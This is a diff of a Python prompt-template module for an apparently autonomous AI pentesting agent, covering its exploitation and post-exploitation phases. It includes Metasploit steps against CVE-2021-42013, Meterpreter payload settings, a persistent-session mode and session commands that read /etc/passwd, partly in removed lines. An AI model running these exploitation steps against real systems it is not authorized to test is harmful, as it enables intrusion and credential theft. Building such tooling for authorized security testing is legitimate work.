@@ -6,6 +6,12 @@ Includes phase-aware reasoning, tool descriptions, and structured output formats
 """
 
 from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
+from utils import get_session_config_prompt
+from params import (
+    INFORMATIONAL_SYSTEM_PROMPT,
+    EXPL_SYSTEM_PROMPT,
+    POST_EXPL_SYSTEM_PROMPT,
+)
 
 
 # =============================================================================
@@ -44,7 +50,6 @@ All Informational tools PLUS:
    - Execute Metasploit Framework commands
    - **THIS TOOL IS NOW STATEFUL** - msfconsole runs persistently in background
    - Module context persists between calls
-   - Sessions persist and can be accessed in later calls!
 
    ## MANDATORY PRE-EXPLOITATION RECONNAISSANCE (DO NOT SKIP!)
 
@@ -75,60 +80,28 @@ All Informational tools PLUS:
    "show payloads"
    ```
    (Module context persists from previous call)
-   This shows all compatible payloads. Choose based on:
-   - Target OS (linux/, cmd/unix/, etc.)
-   - Connection type (reverse_tcp, bind_tcp, etc.)
-   - Shell type (meterpreter, shell, etc.)
+   This shows all compatible payloads. **See the "Payload Selection" section below for which payload to choose.**
 
    ### Step 4: SET OPTIONS (One command per call!)
    **IMPORTANT: Semicolon chaining does NOT work! Send each command separately:**
    ```
-   Call 1: "set PAYLOAD linux/x64/meterpreter/bind_tcp"
-   Call 2: "set RHOSTS 10.0.0.5"
-   Call 3: "set RPORT 443"
-   Call 4: "set SSL true"
-   Call 5: "set LHOST 172.28.0.2"
-   Call 6: "set LPORT 4444"
+   Call 1: "set PAYLOAD <payload-from-guidance>"
+   Call 2: "set RHOSTS <target-ip>"
+   Call 3: "set RPORT <target-port>"
+   Call 4: "set SSL false"   (or "set SSL true" for HTTPS targets)
    ```
+
+   **MANDATORY - Exploit SSL Setting:**
+   This controls how the exploit connects TO the target (not the payload callback).
+   - HTTP target (ports 80, 8080, 8000, etc.) -> `set SSL false`
+   - HTTPS target (ports 443, 8443, etc.) -> `set SSL true`
+   - Wrong setting causes OpenSSL::SSL::SSLError. Always set explicitly.
+
+   Additional options depend on payload type (see Payload Selection section).
 
    ### Step 5: EXECUTE THE EXPLOIT
    ```
    "exploit"
-   ```
-
-   ### Step 6: WAIT FOR SESSION ESTABLISHMENT (CRITICAL!)
-   After running "exploit", the payload stage transfer can take 10-30 seconds (stages can be 3MB+).
-   **DO NOT immediately check sessions!** Wait for the exploit output to show session creation.
-
-   If exploit output shows "Sending stage..." but `sessions -l` shows nothing:
-   1. **Wait and retry**: Run `sessions -l` again after 5-10 seconds
-   2. **Check for errors**: Look for connection refused, timeout, or firewall issues
-   3. **Retry up to 3 times**: Sessions may take time to register
-   4. **Only after 3 failed checks**: Consider the exploit failed and troubleshoot
-
-   ## STATEFUL SESSION MANAGEMENT
-
-   **Sessions now persist between calls!** After a successful exploit:
-   - The session remains open for subsequent interactions
-   - You can run post-exploitation commands in SEPARATE calls
-   - Use `sessions -l` to list active sessions anytime
-
-   **Example workflow (ONE command per call - NO semicolons!):**
-   ```
-   Call 1: "search CVE-2021-42013"
-   Call 2: "use exploit/multi/http/apache_normalize_path_rce"
-   Call 3: "info"                               <-- Module context persists
-   Call 4: "show payloads"
-   Call 5: "set PAYLOAD linux/x64/meterpreter/bind_tcp"
-   Call 6: "set RHOSTS 10.0.0.5"
-   Call 7: "set RPORT 8080"
-   Call 8: "set SSL false"
-   Call 9: "set LPORT 4444"
-   Call 10: "exploit"
-   --> Session 1 opens and PERSISTS
-   Call 11: "sessions -l"                       <-- Shows active session
-   Call 12: "sessions -c 'whoami' -i 1"         <-- Runs on session 1
-   Call 13: "sessions -c 'cat /etc/passwd' -i 1" <-- Still works!
    ```
 
    ## Usage Pattern Summary (ONE COMMAND PER CALL!)
@@ -136,25 +109,60 @@ All Informational tools PLUS:
    1. **Search for CVE**: `"search CVE-XXXX-XXXXX"` → Get exact module path
    2. **Use module**: `"use exploit/path/from/search"` → Load the module
    3. **Get module info**: `"info"` → Understand requirements (context persists)
-   4. **Show payloads**: `"show payloads"` → Choose compatible payload
-   5. **Set options** (each as separate call):
-      - `"set PAYLOAD linux/x64/meterpreter/bind_tcp"`
-      - `"set RHOSTS x.x.x.x"`
-      - `"set RPORT 443"`
-      - `"set SSL true"`
-      - `"set LHOST 172.28.0.2"`
-      - `"set LPORT 4444"`
+   4. **Show payloads**: `"show payloads"` → List compatible payloads
+   5. **Set options** (each as separate call) - see Payload Selection section for payload choice
    6. **Execute exploit**: `"exploit"`
-   7. **Post-exploitation** (separate calls):
-      - `"sessions -l"` → List sessions
-      - `"sessions -c 'whoami' -i 1"` → Run command on session
+   7. **Follow post-exploit steps** from Payload Selection section
+"""
 
-   For command execution (no reverse shell): Use target "Unix Command (In-Memory)":
-   - `"set TARGET 1"` then `"exploit"`
+# =============================================================================
+# PAYLOAD GUIDANCE (Conditional based on POST_EXPL_SESSION)
+# =============================================================================
 
-   **IMPORTANT**: For reverse shell payloads, you MUST set LHOST (attacker IP) and LPORT (listener port).
-   Default LHOST for this environment: 172.28.0.2 (Kali container IP)
-   Default LPORT: 4444
+PAYLOAD_GUIDANCE_SESSION = """
+## Payload Selection (Session Mode)
+
+Your goal is to establish a **persistent Meterpreter session** for post-exploitation.
+
+**IMPORTANT:** The payload settings are PRE-CONFIGURED below. Just follow them!
+
+### Shell Type
+
+Use `meterpreter` (full-featured shell). If it fails, fall back to `shell`.
+
+### After Exploitation
+
+1. Wait 10-30 seconds for Meterpreter stage transfer (~3MB)
+2. Run `sessions -l` to verify session (retry up to 3 times if needed)
+3. Once session is active → transition to post_exploitation phase
+"""
+
+PAYLOAD_GUIDANCE_POC = """
+## Payload Selection (PoC Mode)
+
+Your goal is to **verify the vulnerability works** without establishing a persistent session.
+This is ideal for proof-of-concept demonstrations and vulnerability validation.
+
+**Recommended Payloads:**
+1. `cmd/unix/generic` - Execute a single command and see output
+2. `linux/x64/exec` - Run one command and exit
+
+**Workflow for PoC Exploitation:**
+1. After loading the exploit module, set TARGET to command execution mode:
+   - `set TARGET 2` (Unix Command In-Memory)
+2. Set the PoC payload:
+   - `set PAYLOAD cmd/unix/generic`
+3. Set a verification command:
+   - `set CMD "id && whoami && hostname"`
+4. Execute:
+   - `exploit`
+
+**After Exploitation:**
+- Capture the command output as proof of exploitation
+- Document: "Vulnerability CVE-XXXX-XXXXX confirmed exploitable on [target]"
+- No session management needed
+- Exploitation phase is complete after successful PoC
+- Do NOT transition to post_exploitation phase (no session exists)
 """
 
 POST_EXPLOITATION_TOOLS = """
@@ -199,15 +207,52 @@ All Exploitation tools PLUS enhanced session interaction:
    - Shows running state, active sessions, database status
 """
 
-def get_phase_tools(phase: str) -> str:
-    """Get tool descriptions for the current phase."""
+def get_phase_tools(phase: str, post_expl_session: bool = True) -> str:
+    """Get tool descriptions for the current phase with payload guidance.
+
+    Args:
+        phase: Current agent phase (informational, exploitation, post_exploitation)
+        post_expl_session: If True, guide agent to establish persistent sessions.
+                          If False, guide agent to use PoC payloads for verification only.
+
+    Returns:
+        Concatenated tool descriptions appropriate for the phase and mode.
+    """
+    parts = []
+
+    # Add phase-specific custom system prompt if configured
+    if phase == "informational" and INFORMATIONAL_SYSTEM_PROMPT:
+        parts.append(f"## Custom Instructions\n\n{INFORMATIONAL_SYSTEM_PROMPT}\n")
+    elif phase == "exploitation" and EXPL_SYSTEM_PROMPT:
+        parts.append(f"## Custom Instructions\n\n{EXPL_SYSTEM_PROMPT}\n")
+    elif phase == "post_exploitation" and POST_EXPL_SYSTEM_PROMPT:
+        parts.append(f"## Custom Instructions\n\n{POST_EXPL_SYSTEM_PROMPT}\n")
+
+    # Add tool descriptions based on phase
     if phase == "informational":
-        return INFORMATIONAL_TOOLS
+        parts.append(INFORMATIONAL_TOOLS)
     elif phase == "exploitation":
-        return INFORMATIONAL_TOOLS + "\n" + EXPLOITATION_TOOLS
+        parts.append(INFORMATIONAL_TOOLS)
+        parts.append(EXPLOITATION_TOOLS)
+        payload_guidance = PAYLOAD_GUIDANCE_SESSION if post_expl_session else PAYLOAD_GUIDANCE_POC
+        parts.append(payload_guidance)
+        # Add pre-configured session settings for session mode
+        if post_expl_session:
+            session_config = get_session_config_prompt()
+            if session_config:
+                parts.append(session_config)
     elif phase == "post_exploitation":
-        return INFORMATIONAL_TOOLS + "\n" + EXPLOITATION_TOOLS + "\n" + POST_EXPLOITATION_TOOLS
-    return INFORMATIONAL_TOOLS
+        parts.append(INFORMATIONAL_TOOLS)
+        parts.append(EXPLOITATION_TOOLS)
+        if not post_expl_session:
+            # PoC mode should not reach post_exploitation, but if it does, show PoC guidance
+            parts.append(PAYLOAD_GUIDANCE_POC)
+        else:
+            parts.append(POST_EXPLOITATION_TOOLS)
+    else:
+        parts.append(INFORMATIONAL_TOOLS)
+
+    return "\n".join(parts)
 
 
 # =============================================================================
